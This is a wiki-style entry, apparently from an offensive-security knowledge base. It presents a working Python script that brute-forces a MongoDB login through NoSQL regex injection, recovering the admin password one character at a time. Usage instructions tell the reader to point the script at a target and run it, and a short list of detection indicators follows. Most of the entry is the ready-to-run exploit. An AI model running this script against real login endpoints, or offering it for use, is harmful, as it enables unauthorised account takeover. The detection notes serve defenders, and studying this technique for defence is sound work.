---
id: f579a629-fe0b-44a2-b2b3-28aa2bf8a6d9
type: code
language: Python
verified: true
created_at: '2023-04-06T03:56:31.516037+00:00'
updated_at: '2023-04-10T20:23:01.686214+00:00'
tags:
  - nosql-injection
  - brute-force
platforms:
  - Web
validated: true
---

# MongoDB-Query-Injection-Brute-Force-Script

## Code

```python
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username="admin"
password=""
u="http://example.org/login"
headers={'content-type': 'application/json'}

while True:
    for c in string.printable:
        if c not in ['*','+','.','?','|']:
            payload='{"username": {"$eq": "%s"}, "password": {"$regex": "^%s" }}' % (username, password + c)
            r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
            if 'OK' in r.text or r.status_code == 302:
                print("Found one more char : %s" % (password+c))
                password += c
```

## Description

This Python script performs a blind brute force attack on a MongoDB-backed login endpoint by injecting query operators into the JSON payload. It targets the 'username' field with an exact match ($eq) and the 'password' field with a regex prefix match (^prefix) to iteratively guess each character of the password. The script disables SSL warnings and prevents redirects to focus on response indicators of success.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| username | The target username to brute force against | "admin" |
| u | The full URL of the login endpoint | "http://target.com/login" |
| headers | HTTP headers for the request, including content-type | {'content-type': 'application/json'} |

## Usage

Save the script to a file (e.g., mongodb_bruteforce.py) and execute it with Python: `python mongodb_bruteforce.py`. Update the 'username' and 'u' variables with target-specific values before running. Use in scenarios where the login form is vulnerable to NoSQL injection, such as unsanitized JSON inputs to MongoDB queries. Monitor output for password construction and stop the script once the full password is revealed.

## Detection

- Web application logs showing repeated POST requests to login with JSON payloads containing MongoDB operators like $eq or $regex.
- Anomalous regex patterns in query logs or WAF alerts for injection attempts.
- High volume of 200/302 responses from login endpoint without corresponding successful sessions.
- Network traffic analysis revealing iterative character-guessing patterns in payloads.

## Related

- [[procedures/Brute-Force-Login-via-MongoDB-Query-Injection]]
